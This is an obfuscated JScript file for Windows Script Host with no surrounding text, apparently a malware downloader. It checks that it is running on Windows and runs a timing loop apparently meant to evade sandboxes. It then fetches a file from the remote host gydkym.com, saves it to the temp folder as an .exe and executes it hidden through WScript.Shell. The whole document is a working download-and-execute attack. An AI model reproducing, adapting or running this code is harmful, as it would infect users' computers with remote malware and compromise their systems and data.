var Ljafjel = false;
var Kdvhsdj = "CreateObject";
var Txenz = function Yrndwdtice() {return WScript[Kdvhsdj]("WScript.Shell");}();
var Suxug = 123213;
var Eodevdqbp = "MSXML2.XMLHTTP";
var Usfarl = 2123213;
var Iipymvuobn = 0;
function Nlzczw(Jxgpnof){Txenz["Run"](Jxgpnof, Iipymvuobn, Iipymvuobn);};
function Xefjcw(){return Eodevdqbp;};
function Qaopxj(Zixmhls, Vurnbrtcly){return Zixmhls - Vurnbrtcly;};
function Xmsgg(){return Kdvhsdj;};
/*@cc_on
  @if (@_win32 || @_win64)
    Ljafjel = true;
  @end
@*/
var Yksmlyqsyj = "";
if (Ljafjel)
{
function Hfeatnv(){return 22;};
var Enctu = 0; var Xbyusa = 0;
function Pdtivr()
{
var Gfhpwld = new this["Date"]();
var Tpfgmxkte = Gfhpwld["getUTCMilliseconds"]();
WScript["Sleep"](Hfeatnv());
var Gfhpwld = new this["Date"]();
var Fpnhjlttlm = Gfhpwld["getUTCMilliseconds"]();
WScript["Sleep"](Hfeatnv());
var Gfhpwld = new this["Date"]();
var Xlbjy = Gfhpwld["getUTCMilliseconds"]();
var Enctu = "Gnocpkb";
Enctu = Qaopxj(Fpnhjlttlm, Tpfgmxkte);
var Xbyusa = "Nanowwzlyo";
Xbyusa = Qaopxj(Xlbjy, Fpnhjlttlm);
Yksmlyqsyj = "open";
return Qaopxj(Enctu, Xbyusa);
}
var Cnfnmoc = false;
var Iebdapu = false;
for (var Afdmpyzb = Iipymvuobn; Afdmpyzb < Hfeatnv() * 1; Afdmpyzb++){if (Pdtivr() != Iipymvuobn){
Cnfnmoc = true; 
Xbyusa = "07t9gasdf76ags" + 123313 * Enctu + Xbyusa; 
Iebdapu = true; 
Xbyusa = "07t9gasdf76ags" + 123313 * Enctu + Xbyusa; 
break;
}}
function Qfwud() {return ((Cnfnmoc == true) && (Cnfnmoc == Iebdapu)) ? 1 : Iipymvuobn;};
if (Cnfnmoc && Qfwud() && Iebdapu){
function Vmezpcwved() {return Txenz["ExpandEnvironmentStrings"]("%TEMP%/") + "tU0fHpUQnSqnxrk.exe";};
 Omhapud = Xefjcw();
 Wjzaw = WScript[Kdvhsdj](Omhapud);
 var Zfvzpmccy = 1;
 while (Zfvzpmccy){
try {
Wjzaw[Yksmlyqsyj]("GET", "http://gydkym.com/dk3s8sja", false);
Wjzaw["send"]();
Gfwesoty = "Sleep";
do {WScript[Gfwesoty](Hfeatnv() * 11)} while (Wjzaw["readystate"] < 4 );
Zfvzpmccy = Iipymvuobn;
} catch(Hjflu){Zfvzpmccy = ("asdfa", "fadfasdf", "afdafa", 2);};
}
function Pbxhbom(Yujucmg) {var Yjnrwijyhb = (1, 2, 3, 4, 5, Yujucmg); return Yjnrwijyhb;};
Rtmfeg = WScript[Xmsgg()]("ADODB.Stream");
Omhapud = Rtmfeg;
Omhapud[Yksmlyqsyj]();
Omhapud["type"] = Pbxhbom(1);
Omhapud["write"](Wjzaw["ResponseBody"]);
Rtmfeg["position"] = Pbxhbom(Iipymvuobn);
Omhapud["SaveToFile"](Vmezpcwved(), Pbxhbom(2) );
Rtmfeg["close"]();
Nlzczw(Vmezpcwved());
}
}

